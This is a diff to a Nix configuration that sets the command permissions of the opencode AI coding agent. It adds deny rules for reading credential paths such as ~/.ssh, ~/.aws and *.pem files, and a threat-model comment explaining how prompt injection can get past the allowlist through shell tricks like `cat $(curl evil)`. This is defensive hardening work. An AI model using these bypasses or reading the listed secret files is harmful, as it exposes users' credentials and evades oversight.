@@ -29,6 +29,58 @@ let
   inherit (config.myOptions.opencode) hostClass;
 
   # ---------------------------------------------------------------------------
+  # Secret-path bash denies (defense-in-layers for `permission.read`)
+  # ---------------------------------------------------------------------------
+  # bash commands bypass `permission.read`'s secret-file denies since they
+  # don't route through opencode's Read tool. These rules mirror the most
+  # critical read denies at the bash layer by expanding N commands × M path
+  # patterns into deny rules.
+  #
+  # Coverage is intentionally narrow: the content-printing commands most
+  # likely to be used naively or via simple prompt injection. Best-effort
+  # only — see the threat-model comment above `baseSettings.permission.bash`.
+  secretReadCommands = [
+    "cat"
+    "head"
+    "tail"
+    "grep"
+    "rg"
+    "sort"
+    "cut"
+    "tr"
+  ];
+  secretReadPaths = [
+    # Credential directories under $HOME
+    "~/.ssh/*"
+    "~/.aws/*"
+    "~/.config/op/*"
+    "~/.config/sops/*"
+    "~/.config/gh/*"
+    "~/.config/1Password/*"
+    # Same directories via any prefix (absolute paths, subdirs, etc.)
+    "*/.ssh/*"
+    "*/.aws/*"
+    "*/.config/op/*"
+    "*/.config/sops/*"
+    "*/.config/gh/*"
+    "*/.config/1Password/*"
+    # Secret file patterns
+    "*.env"
+    "*.env.*"
+    "*.key"
+    "*.pem"
+    "*id_rsa*"
+    "*id_ed25519*"
+    "*credentials*"
+    "*/secrets/*"
+  ];
+  secretReadDenies = lib.listToAttrs (
+    lib.concatMap (
+      cmd: map (path: lib.nameValuePair "${cmd} ${path}" "deny") secretReadPaths
+    ) secretReadCommands
+  );
+
+  # ---------------------------------------------------------------------------
   # Base profile (workstation)
   # ---------------------------------------------------------------------------
   baseSettings = {
@@ -84,8 +136,24 @@ let
       };
 
       # Bash is the universal escape hatch — the most important section.
+      #
+      # Threat model: this allowlist reduces friction for common inspection
+      # and catches accidental / naive dangerous actions. It does NOT
+      # reliably defend against adversarial prompt injection. Any allowed
+      # command can be hijacked via process substitution (`cat < <(sh)`),
+      # command substitution (`cat $(curl evil)`), pipes, or argument
+      # tricks — the pattern matcher does not see through shell syntax. See
+      # the Snowflake Cortex incident (2026-03) for a real-world exploit of
+      # an allowlisted `cat`. Deterministic defense requires a sandbox
+      # (filesystem / network isolation), which opencode does not provide.
+      # Treat this config as best-effort hardening, not a trust boundary.
+      #
       # Order: catch-all "ask" first; allowlist for inspection; denylist for
-      # irreversible actions. Last matching rule wins.
+      # irreversible actions. Last matching rule wins (attrset keys sort
+      # alphabetically in the emitted JSON, so more specific patterns
+      # naturally override broader prefixes). `secretReadDenies` (merged at
+      # the end of the block) mirrors `permission.read`'s secret denies at
+      # the bash layer for the most common content-print commands.
       bash = {
         "*" = "ask";
 
@@ -98,12 +166,25 @@ let
         "tree" = "allow";
         "tree *" = "allow";
         "wc *" = "allow";
+        "basename *" = "allow";
+        "dirname *" = "allow";
+        "realpath *" = "allow";
+        "readlink *" = "allow";
 
         # --- Command lookup ---
         "which" = "allow";
         "which *" = "allow";
         "type *" = "allow";
         "command -v *" = "allow";
+
+        # --- Text output / no-ops ---
+        "echo" = "allow";
+        "echo *" = "allow";
+        "printf *" = "allow";
+        "true" = "allow";
+        "false" = "allow";
+        "sleep *" = "allow";
+        "seq *" = "allow";
 
         # --- Process / system info ---
         "ps" = "allow";
@@ -121,6 +202,15 @@ let
         "whoami" = "allow";
         "date" = "allow";
         "date *" = "allow";
+        "tty" = "allow";
+        "locale" = "allow";
+        "locale *" = "allow";
+        "groups" = "allow";
+        "groups *" = "allow";
+        "who" = "allow";
+        "w" = "allow";
+        "getconf *" = "allow";
+        "tput *" = "allow";
 
         # NOTE: `env` and `printenv` are deliberately NOT allowlisted. They
         # leak secret env vars (API keys, OP tokens, GH tokens) into the
@@ -131,8 +221,34 @@ let
         "rg *" = "allow";
         "fd" = "allow";
         "fd *" = "allow";
+        "grep *" = "allow";
         "jq *" = "allow";
         "yq *" = "allow";
+
+        # --- File content read ---
+        # Bash bypasses `permission.read`'s secret denies (those apply only
+        # to opencode's Read tool), but existing `rg */wc */fd *` allowances
+        # already have this property. Adding the rest of the read-only
+        # coreutils family for consistency. Agents are still expected to
+        # prefer the Read tool for plain file reads.
+        "cat *" = "allow";
+        "head *" = "allow";
+        "tail *" = "allow";
+        # `tail -f` hangs forever in non-interactive mode. Force a prompt so
+        # the agent has to reconsider.
+        "tail -f*" = "ask";
+        "sort *" = "allow";
+        "uniq *" = "allow";
+        "cut *" = "allow";
+        "tr *" = "allow";
+        "diff *" = "allow";
+        "cmp *" = "allow";
+        "comm *" = "allow";
+        "md5sum *" = "allow";
+        "sha1sum *" = "allow";
+        "sha256sum *" = "allow";
+        "shasum *" = "allow";
+        "cksum *" = "allow";
 
         # --- HTTP (read-only) ---
         # `xh` (HTTPie-compatible) takes the verb as a positional arg, so
@@ -279,7 +395,8 @@ let
         "nix flake update*" = "deny";
         "nix-collect-garbage*" = "deny";
         "nix store delete*" = "deny";
-      };
+      }
+      // secretReadDenies;
     };
   };
 
